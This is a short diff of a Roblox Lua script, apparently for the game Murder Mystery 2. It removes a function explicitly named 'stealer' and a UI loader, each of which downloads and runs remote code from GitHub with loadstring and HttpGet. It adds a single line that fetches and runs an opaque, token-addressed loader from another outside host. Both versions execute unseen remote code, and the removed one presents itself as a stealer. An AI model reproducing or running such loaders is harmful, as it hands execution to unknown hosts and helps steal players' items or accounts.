@@ -1,9 +1,1 @@
-local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/GXKISAME/Script/refs/heads/main/MM2'))()
-end
-local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/GXKISAME/MM2.Zyleak/refs/heads/main/MM2'))()
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImFlZDZlMjUyLTI2NTEtNDU0Yy05OTlmLWZlOTE2Mjk4OThjNyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmUifX0"))()
